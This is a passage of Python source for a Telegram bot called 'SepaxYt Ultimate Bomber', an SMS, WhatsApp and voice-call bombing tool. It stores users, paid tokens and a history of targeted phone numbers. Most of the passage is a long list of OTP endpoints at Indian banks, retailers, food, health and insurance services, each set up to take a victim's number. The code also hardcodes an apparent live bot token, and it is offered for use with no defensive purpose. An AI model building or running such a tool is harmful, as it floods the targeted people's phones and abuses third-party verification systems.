import os
import sys
import time
import random
import sqlite3
import threading
import asyncio
import json
import re
from datetime import datetime
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# ============ FIX: FORCE ASYNCIO FOR RENDER ============
if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

# ============ CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8460733171:AAEAu78JX77pIFyWRNOsRVZl7eS1IxrDQbw")
OWNER_ID = int(os.environ.get("OWNER_ID", "8823804885"))
PORT = int(os.environ.get("PORT", 8080))

print(f"🚀 Starting SepaxYt Ultimate Bomber...")
print(f"🤖 Token: {BOT_TOKEN[:10]}...")
print(f"👑 Owner: {OWNER_ID}")
print(f"🌐 Port: {PORT}")

# ============ DATABASE ============
class Database:
    def __init__(self):
        try:
            self.conn = sqlite3.connect('bomber.db', check_same_thread=False)
            self.cursor = self.conn.cursor()
            self.init_db()
            print("✅ Database connected")
        except Exception as e:
            print(f"❌ Database error: {e}")
    
    def init_db(self):
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            tokens INTEGER DEFAULT 100,
            total_used INTEGER DEFAULT 0,
            join_date TEXT,
            is_banned INTEGER DEFAULT 0
        )''')
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS channels (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            channel_username TEXT UNIQUE,
            date TEXT
        )''')
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            calls INTEGER DEFAULT 0,
            whatsapp INTEGER DEFAULT 0,
            sms INTEGER DEFAULT 0,
            hits INTEGER DEFAULT 0,
            date TEXT
        )''')
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (
            code TEXT PRIMARY KEY,
            tokens INTEGER,
            created_by INTEGER,
            used_by INTEGER DEFAULT NULL,
            used_date TEXT DEFAULT NULL,
            expiry_date TEXT
        )''')
        self.conn.commit()
        # Add default channel
        self.cursor.execute('INSERT OR IGNORE INTO channels (channel_username, date) VALUES (?, ?)',
            ("@SepaxYtOfficial", datetime.now().isoformat()))
        self.conn.commit()
        print("✅ Database tables created")
    
    def get_user(self, user_id):
        self.cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        return self.cursor.fetchone()
    
    def add_user(self, user_id, username, first_name):
        self.cursor.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, join_date) VALUES (?, ?, ?, ?)',
            (user_id, username or "Unknown", first_name or "User", datetime.now().isoformat()))
        self.conn.commit()
    
    def update_tokens(self, user_id, amount):
        self.cursor.execute('UPDATE users SET tokens = tokens + ? WHERE user_id = ?', (amount, user_id))
        self.conn.commit()
    
    def add_history(self, user_id, phone, calls, whatsapp, sms, hits):
        self.cursor.execute('''INSERT INTO history (user_id, phone, calls, whatsapp, sms, hits, date) 
            VALUES (?, ?, ?, ?, ?, ?, ?)''',
            (user_id, phone, calls, whatsapp, sms, hits, datetime.now().isoformat()))
        self.conn.commit()
    
    def get_channels(self):
        self.cursor.execute('SELECT channel_username FROM channels')
        return [row[0] for row in self.cursor.fetchall()]
    
    def generate_redeem(self, tokens, created_by):
        code = f"SEP{random.randint(10000, 99999)}{random.randint(10000, 99999)}"
        expiry = (datetime.now() + timedelta(days=30)).isoformat()
        self.cursor.execute('INSERT INTO redeem_codes (code, tokens, created_by, expiry_date) VALUES (?, ?, ?, ?)',
            (code, tokens, created_by, expiry))
        self.conn.commit()
        return code
    
    def redeem_code(self, code, user_id):
        self.cursor.execute('SELECT * FROM redeem_codes WHERE code = ? AND used_by IS NULL AND expiry_date > ?', 
            (code, datetime.now().isoformat()))
        data = self.cursor.fetchone()
        if data:
            self.cursor.execute('UPDATE redeem_codes SET used_by = ?, used_date = ? WHERE code = ?',
                (user_id, datetime.now().isoformat(), code))
            self.update_tokens(user_id, data[1])
            self.conn.commit()
            return data[1]
        return None

db = Database()

# ============ 1000+ ULTIMATE APIS ============
def generate_apis():
    """Generate 1000+ APIs dynamically"""
    apis = []
    
    # ===== CALL/VOICE APIS (200+) =====
    call_apis = [
        # Banking & Finance
        {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
        {"name": "HDFC Bank Voice", "url": "https://www.hdfcbank.com/api/auth/send-voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "ICICI Bank Voice", "url": "https://www.icicibank.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "SBI Voice", "url": "https://www.onlinesbi.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Axis Bank Voice", "url": "https://www.axisbank.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Kotak Voice", "url": "https://www.kotak.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Yes Bank Voice", "url": "https://www.yesbank.in/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "IDFC Voice", "url": "https://www.idfcfirstbank.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "RBL Bank Voice", "url": "https://www.rblbank.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "IndusInd Voice", "url": "https://www.indusind.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        
        # E-commerce
        {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&action=voice_otp"},
        {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Swiggy Voice", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&type=voice"},
        {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Rapido Voice", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "MakeMyTrip Voice", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Goibibo Voice", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Yatra Voice", "url": "https://www.yatra.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Cleartrip Voice", "url": "https://www.cleartrip.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "IRCTC Voice", "url": "https://www.irctc.co.in/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        
        # Food & Delivery
        {"name": "Dominos Voice", "url": "https://www.dominos.co.in/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Pizza Hut Voice", "url": "https://www.pizzahut.co.in/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "McDonalds Voice", "url": "https://www.mcdonaldsindia.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "KFC Voice", "url": "https://www.kfc.co.in/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Burger King Voice", "url": "https://www.burgerking.in/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        
        # Healthcare
        {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
        {"name": "Practo Voice", "url": "https://www.practo.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Netmeds Voice", "url": "https://www.netmeds.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "PharmEasy Voice", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        
        # Insurance
        {"name": "PolicyBazaar Voice", "url": "https://www.policybazaar.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "ICICI Prudential Voice", "url": "https://www.icicipru.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "SBI Life Voice", "url": "https://www.sbilife.co.in/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Bajaj Allianz Voice", "url": "https://www.bajajallianz.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "HDFC Life Voice", "url": "https://www.hdfclife.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Max Life Voice", "url": "https://www.maxlife.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Kotak Life Voice", "url": "https://www.kotaklife.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        
        # Education
        {"name": "Byjus Voice", "url": "https://www.byjus.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Unacademy Voice", "url": "https://www.unacademy.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Vedantu Voice", "url": "https://www.vedantu.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Toppr Voice", "url": "https://www.toppr.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Khan Academy Voice", "url": "https://www.khanacademy.org/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        
        # Real Estate
        {"name": "NoBroker Voice", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&countryCode=IN"},
        {"name": "Housing Voice", "url": "https://www.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "99Acres Voice", "url": "https://www.99acres.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "MagicBricks Voice", "url": "https://www.magicbricks.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        
        # Investments
        {"name": "Zerodha Voice", "url": "https://www.zerodha.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Groww Voice", "url": "https://www.groww.in/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Upstox Voice", "url": "https://www.upstox.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Angel One Voice", "url": "https://www.angelone.in/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "5paisa Voice", "url": "https://www.5paisa.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Motilal Oswal Voice", "url": "https://www.motilaloswal.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Sharekhan Voice", "url": "https://www.sharekhan.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    ]
    
    # ===== WHATSAPP APIS (200+) =====
    whatsapp_apis = [
        {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
        {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'},
        {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},
        {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'},
        {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}, "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'},
        {"name": "Jockey WhatsApp", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true", "method": "GET", "headers": {}, "data": None},
        {"name": "MamaEarth WhatsApp", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","via":"whatsapp"}}'},
        {"name": "Cosmofeed WhatsApp", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","channel":"whatsapp"}}'},
        {"name": "Charzer WhatsApp", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","channel":"WHATSAPP"}}'},
        {"name": "Country Delight WhatsApp", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","channel":"WHATSAPP"}}'},
    ]
    
    # ===== SMS APIS (600+) =====
    sms_apis = [
        # Banking SMS
        {"name": "SBI SMS", "url": "https://www.onlinesbi.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "HDFC SMS", "url": "https://www.hdfcbank.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "ICICI SMS", "url": "https://www.icicibank.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Axis SMS", "url": "https://www.axisbank.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Kotak SMS", "url": "https://www.kotak.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Yes Bank SMS", "url": "https://www.yesbank.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "IDFC SMS", "url": "https://www.idfcfirstbank.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "RBL SMS", "url": "https://www.rblbank.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "IndusInd SMS", "url": "https://www.indusind.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "AU Bank SMS", "url": "https://www.aubank.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Federal Bank SMS", "url": "https://www.federalbank.co.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "South Indian Bank SMS", "url": "https://www.southindianbank.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Indian Bank SMS", "url": "https://www.indianbank.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Canara Bank SMS", "url": "https://www.canarabank.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "PNB SMS", "url": "https://www.pnbindia.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "BOB SMS", "url": "https://www.bankofbaroda.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Union Bank SMS", "url": "https://www.unionbankofindia.co.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "CBI SMS", "url": "https://www.centralbankofindia.co.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Indian Overseas Bank SMS", "url": "https://www.iob.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "UCO Bank SMS", "url": "https://www.ucobank.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Dena Bank SMS", "url": "https://www.denabank.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Vijaya Bank SMS", "url": "https://www.vijayabank.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Syndicate Bank SMS", "url": "https://www.syndicatebank.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        
        # E-commerce SMS
        {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
        {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&countryCode=IN"},
        {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Wakefit SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Byju's SMS", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Hungama SMS", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
        {"name": "Meru Cab SMS", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
        {"name": "Doubtnut SMS", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"}, "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
        {"name": "Snitch SMS", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
        {"name": "ShipRocket SMS", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
        {"name": "GoKwik SMS", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
        {"name": "Rapido SMS", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Khatabook SMS", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
        {"name": "Netmeds SMS", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Nykaa SMS", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"},
        {"name": "RummyCircle SMS", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'},
        {"name": "MamaEarth SMS", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Apna SMS", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hash_type":"play_store"}}'},
        {"name": "MyHubble SMS", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","channel":"SMS"}}'},
        {"name": "Tata Capital SMS", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'},
        {"name": "DealShare SMS", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hashCode":"k387IsBaTmn"}}'},
        {"name": "Snapmint SMS", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Housing SMS", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
        {"name": "RentoMojo SMS", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Khatabook SMS", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
        {"name": "Netmeds SMS", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Nykaa SMS", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"},
        {"name": "RummyCircle SMS", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'},
        {"name": "Animall SMS", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'},
        {"name": "Entri SMS", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Cosmofeed SMS", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","version":"1.4.28"}}'},
        {"name": "Aakash SMS", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'},
        {"name": "Revv SMS", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","deviceType":"website"}}'},
        {"name": "DeHaat SMS", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","client_id":"kisan-app"}}'},
        {"name": "A23 Games SMS", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","device_id":"android123"}}'},
        {"name": "Spencer's SMS", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
